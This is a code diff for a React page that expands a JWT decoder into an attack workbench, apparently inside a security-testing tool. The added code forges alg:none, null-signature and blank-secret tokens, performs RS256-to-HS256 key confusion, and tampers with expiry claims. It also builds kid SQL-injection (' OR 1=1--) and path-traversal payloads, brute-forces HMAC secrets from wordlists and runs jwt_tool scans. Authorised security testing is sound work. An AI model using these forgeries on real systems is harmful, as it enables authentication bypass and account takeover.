@@ -1,28 +1,57 @@
-import { useMemo, useState } from 'react'
+import { useEffect, useRef, useState } from 'react'
 import { Link, useParams } from 'react-router-dom'
+import { useMutation } from '@tanstack/react-query'
+import { api } from '../../api/client'
 
-function decodePart(value: string): unknown {
-  const normalized = value.replace(/-/g, '+').replace(/_/g, '/')
-  const padded = normalized.padEnd(Math.ceil(normalized.length / 4) * 4, '=')
-  return JSON.parse(new TextDecoder().decode(Uint8Array.from(atob(padded), (char) => char.charCodeAt(0))))
-}
+const b64url = (bytes: Uint8Array) => { let binary = ''; bytes.forEach(byte => { binary += String.fromCharCode(byte) }); return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '') }
+const b64text = (value: string) => b64url(new TextEncoder().encode(value))
+function decodeBytes(value: string) { const normalized = value.replace(/-/g, '+').replace(/_/g, '/').padEnd(Math.ceil(value.length / 4) * 4, '='); const binary = atob(normalized); return Uint8Array.from(binary, char => char.charCodeAt(0)) }
+function decodeJson(value: string): unknown { return JSON.parse(new TextDecoder().decode(decodeBytes(value))) }
+function pretty(value: unknown) { return JSON.stringify(value, null, 2) }
+async function hs256(header: string, payload: string, secret: string) { const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']); const signature = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(`${header}.${payload}`)); return `${header}.${payload}.${b64url(new Uint8Array(signature))}` }
 
 export function JwtPage() {
   const { projectId = '' } = useParams()
-  const [token, setToken] = useState('')
-  const decoded = useMemo(() => {
-    if (!token.trim()) return { header: null, payload: null, signature: '', error: '' }
+  const [token, setToken] = useState(() => localStorage.getItem('awe-jwt-token') || '')
+  const [header, setHeader] = useState('')
+  const [payload, setPayload] = useState('')
+  const [signature, setSignature] = useState('')
+  const [hPart, setHPart] = useState(''); const [pPart, setPPart] = useState(''); const [sigPart, setSigPart] = useState('')
+  const [error, setError] = useState(''); const [output, setOutput] = useState(''); const [resultToken, setResultToken] = useState('')
+  const [secret, setSecret] = useState(() => localStorage.getItem('awe-jwt-secret') || '')
+  const [pubkey, setPubkey] = useState(() => localStorage.getItem('awe-jwt-pubkey') || '')
+  const [kid, setKid] = useState("' OR 1=1--"); const [kidSecret, setKidSecret] = useState('')
+  const [wordlist, setWordlist] = useState(''); const [scanUrl, setScanUrl] = useState(''); const [cookie, setCookie] = useState('jwt'); const [scanHeader, setScanHeader] = useState('Authorization: Bearer'); const [scanMode, setScanMode] = useState('decode')
+  const wordlistRef = useRef<HTMLInputElement>(null)
+  const scan = useMutation({ mutationFn: () => api.scanJwt({ token: token.trim(), url: scanUrl.trim(), cookie, header: scanHeader, mode: scanMode }), onSuccess: data => setOutput(old => `${old}\n[jwt_tool]\n${data.output}`.trim()) })
+
+  useEffect(() => { localStorage.setItem('awe-jwt-token', token); localStorage.setItem('awe-jwt-secret', secret); localStorage.setItem('awe-jwt-pubkey', pubkey); localStorage.setItem('awe-jwt-header', header); localStorage.setItem('awe-jwt-payload', payload) }, [token, secret, pubkey, header, payload])
+  useEffect(() => { if (token.trim()) { parseToken(); const savedHeader = localStorage.getItem('awe-jwt-header'); const savedPayload = localStorage.getItem('awe-jwt-payload'); if (savedHeader) setHeader(savedHeader); if (savedPayload) setPayload(savedPayload) } }, [])
+  function parseToken() {
     try {
       const parts = token.trim().split('.')
-      if (parts.length !== 3) throw new Error('A JWT must have three dot-separated segments')
-      return { header: decodePart(parts[0]), payload: decodePart(parts[1]), signature: parts[2], error: '' }
-    } catch (error) { return { header: null, payload: null, signature: '', error: error instanceof Error ? error.message : 'Invalid JWT' } }
-  }, [token])
-
-  return <main className="page feature-page">
-    <Link className="back-link" to={`/projects/${projectId}`}>← Project workspace</Link>
-    <header className="page-header"><div><p className="eyebrow">Token analysis</p><h1>JWT Inspector</h1><p className="muted">Inspect token structure locally. Decoding does not verify the signature.</p></div></header>
-    <label className="panel editor-panel token-input"><span>Encoded token</span><textarea value={token} onChange={(event) => setToken(event.target.value)} placeholder="eyJhbGciOi…" spellCheck={false} />{decoded.error && <small className="error">{decoded.error}</small>}</label>
-    <section className="jwt-grid"><article className="panel json-card"><span>Header</span><pre>{decoded.header ? JSON.stringify(decoded.header, null, 2) : '—'}</pre></article><article className="panel json-card"><span>Payload</span><pre>{decoded.payload ? JSON.stringify(decoded.payload, null, 2) : '—'}</pre></article><article className="panel json-card signature-card"><span>Signature</span><pre>{decoded.signature || '—'}</pre></article></section>
+      if (parts.length < 2 || parts.length > 3) throw new Error('JWT must have two or three dot-separated segments')
+      const decodedHeader = decodeJson(parts[0]); const decodedPayload = decodeJson(parts[1])
+      setHeader(pretty(decodedHeader)); setPayload(pretty(decodedPayload)); setSignature(parts[2] ? Array.from(decodeBytes(parts[2])).map(byte => byte.toString(16).padStart(2, '0')).join('') : '')
+      setHPart(parts[0]); setPPart(parts[1]); setSigPart(parts[2] || ''); setError(''); setOutput(old => `${old}\nParsed JWT · alg=${(decodedHeader as { alg?: string }).alg || '?'} · ${parts[2] ? 'signed' : 'unsigned'}`.trim())
+    } catch (caught) { setError(caught instanceof Error ? caught.message : 'Invalid JWT') }
+  }
+  function clear() { setToken(''); setHeader(''); setPayload(''); setSignature(''); setHPart(''); setPPart(''); setSigPart(''); setResultToken(''); setOutput(''); setError('') }
+  function requireParsed() { if (!hPart || !pPart) { setOutput(old => `${old}\nParse a JWT token first.`.trim()); return false } return true }
+  function currentParts() { let h = hPart; let p = pPart; try { h = b64text(JSON.stringify(JSON.parse(header))); } catch { setOutput(old => `${old}\nHeader is not valid JSON.`.trim()) } try { p = b64text(JSON.stringify(JSON.parse(payload))); } catch { setOutput(old => `${old}\nPayload is not valid JSON.`.trim()) } return { h, p } }
+  function headerWith(overrides: Record<string, unknown>) { try { const next = { ...(JSON.parse(header) as Record<string, unknown>), ...overrides }; return b64text(JSON.stringify(next)) } catch { return hPart } }
+  function emit(label: string, value: string, note = '') { setResultToken(value); setOutput(old => `${old}\n\n[${label}]\n${value}${note ? `\n${note}` : ''}`.trim()) }
+  function algNone() { if (!requireParsed()) return; const { p } = currentParts(); emit('alg:none · CVE-2015-2951', `${headerWith({ alg: 'none' })}.${p}.`, 'Signature stripped; test only systems you are authorised to assess.') }
+  function nullSignature() { if (!requireParsed()) return; const { h, p } = currentParts(); emit('Null signature · CVE-2020-28042', `${h}.${p}.${b64url(new Uint8Array(32))}`) }
+  async function sign(secretValue: string, label: string, overrides: Record<string, unknown> = {}) { if (!requireParsed()) return; const { p } = currentParts(); const result = await hs256(headerWith({ alg: 'HS256', ...overrides }), p, secretValue); emit(label, result) }
+  function tamper(preset: string) { if (!requireParsed()) return; try { const obj = JSON.parse(payload) as Record<string, unknown>; const now = Math.floor(Date.now() / 1000); if (preset === '+24h') obj.exp = now + 86400; if (preset === '+30d') obj.exp = now + 2592000; if (preset === '+1yr') obj.exp = now + 31536000; if (preset === 'max') obj.exp = 9999999999; if (preset === 'remove_exp') delete obj.exp; if (preset === 'remove_nbf') delete obj.nbf; if (preset === 'now_iat') obj.iat = now; setPayload(pretty(obj)); setOutput(old => `${old}\nTimestamp payload updated (${preset}); re-sign to generate a token.`.trim()) } catch { setOutput(old => `${old}\nPayload is not valid JSON.`.trim()) } }
+  async function bruteForce(file: File) { if (!requireParsed() || !sigPart) { setOutput(old => `${old}\nA signed JWT is required for brute force.`.trim()); return } const { p } = currentParts(); const candidates = (await file.text()).split(/\r?\n/).map(line => line.trim()).filter(Boolean); for (let index = 0; index < candidates.length; index += 1) { const candidate = candidates[index]; const generated = await hs256(hPart, p, candidate); if (generated.split('.')[2] === sigPart) { emit('Brute force · secret found', generated, `Secret: ${candidate}`); return } if (index % 500 === 0) setOutput(old => `${old}\nTried ${index.toLocaleString()} candidates…`.trim()) } setOutput(old => `${old}\nBrute force complete; no secret found.`.trim()) }
+  function copy(value: string) { if (value) void navigator.clipboard.writeText(value) }
+  const attackButton = (label: string, action: () => void, className = '') => <button className={className} onClick={action}>{label}</button>
+  return <main className="page feature-page jwt-page"><Link className="back-link" to={`/projects/${projectId}`}>← Project workspace</Link><header className="page-header"><div><p className="eyebrow">Token analysis and attack workbench</p><h1>JWT Analyzer</h1><p className="muted">Decode, edit, sign, tamper, and run authorised JWT security checks locally or with jwt_tool.</p></div></header>
+    <section className="panel jwt-toolbar"><input value={token} onChange={event => setToken(event.target.value)} onKeyDown={event => { if (event.key === 'Enter') parseToken() }} placeholder="Paste JWT token here…" spellCheck={false}/><button onClick={parseToken}>Parse</button><button onClick={clear}>Clear</button><button onClick={() => copy(output)}>Copy output</button><button onClick={() => copy(resultToken)}>Copy token</button></section>{error && <p className="error">{error}</p>}
+    <section className="jwt-workbench"><div className="jwt-panes"><article className="panel jwt-pane"><header>HEADER</header><textarea value={header} onChange={event => setHeader(event.target.value)} spellCheck={false}/></article><article className="panel jwt-pane"><header>PAYLOAD <small>editable</small></header><textarea value={payload} onChange={event => setPayload(event.target.value)} spellCheck={false}/></article><article className="panel jwt-pane jwt-signature"><header>SIGNATURE</header><pre>{signature || 'Unsigned'}</pre></article></div>
+      <aside className="panel jwt-attacks"><h3>Attacks</h3>{attackButton('alg:none · CVE-2015-2951', algNone, 'jwt-danger')}{attackButton('Null signature · CVE-2020-28042', nullSignature, 'jwt-danger')}{attackButton('Blank password · CVE-2019-20933', () => void sign('', 'Blank password · HS256'), 'jwt-danger')}<h4>Sign HS256</h4><input value={secret} onChange={event => setSecret(event.target.value)} placeholder="HMAC secret"/><button onClick={() => void sign(secret, 'HS256 re-sign')}>Sign with secret ▶</button><h4>RS256 → HS256 confusion</h4><textarea value={pubkey} onChange={event => setPubkey(event.target.value)} placeholder="RSA public key PEM"/><button onClick={() => void sign(pubkey, 'RS256 → HS256 key confusion')}>Use public key ▶</button><h4>Timestamp tamper</h4><div className="jwt-button-row">{['+24h', '+30d', '+1yr', 'max'].map(value => attackButton(value, () => tamper(value), 'jwt-warn'))}</div><div className="jwt-button-row">{['remove_exp', 'remove_nbf', 'now_iat'].map(value => attackButton(value.replace('_', ' '), () => tamper(value)))}</div><h4>kid header attacks</h4><input value={kid} onChange={event => setKid(event.target.value)} placeholder="kid value"/><input value={kidSecret} onChange={event => setKidSecret(event.target.value)} placeholder="Signing secret (blank = empty)"/><div className="jwt-button-row">{attackButton('SQL inject', () => void sign(kidSecret, 'kid SQL injection', { kid: "' OR 1=1--" }), 'jwt-danger')}{attackButton('Traversal', () => void sign('', 'kid path traversal', { kid: '../../dev/null' }), 'jwt-danger')}{attackButton('Custom kid', () => void sign(kidSecret, 'Custom kid', { kid }), 'jwt-danger')}</div><h4>Brute force</h4><input ref={wordlistRef} hidden type="file" accept=".txt" onChange={event => { const file = event.target.files?.[0]; if (file) { setWordlist(file.name); void bruteForce(file) } }}/><button onClick={() => wordlistRef.current?.click()}>Select wordlist{wordlist ? ` · ${wordlist}` : ''}</button><h4>jwt_tool Docker scan</h4><input value={scanUrl} onChange={event => setScanUrl(event.target.value)} placeholder="Target URL (optional)"/><div className="jwt-inline-fields"><input value={cookie} onChange={event => setCookie(event.target.value)} placeholder="Cookie name"/><input value={scanHeader} onChange={event => setScanHeader(event.target.value)} placeholder="Authorization: Bearer"/></div><select value={scanMode} onChange={event => setScanMode(event.target.value)}><option value="decode">decode only</option><option value="pb">pb · Playbook</option><option value="at">at · All tests</option><option value="er">er · Error responses</option><option value="as">as · Alg switch</option><option value="rs">rs · RS/HS switch</option><option value="ki">ki · Key injection</option></select><button className="jwt-success" disabled={scan.isPending||!token.trim()} onClick={() => scan.mutate()}>{scan.isPending ? 'Running…' : '▶ Run jwt_tool'}</button></aside></section>
+    <section className="jwt-output panel"><header><b>Output</b><button onClick={() => setOutput('')}>Clear</button></header><pre>{output || 'Parse a token and run an operation.'}</pre>{resultToken && <div className="jwt-result-token"><label>Last generated token</label><input readOnly value={resultToken}/><button onClick={() => copy(resultToken)}>Copy</button></div>}</section>
   </main>
 }
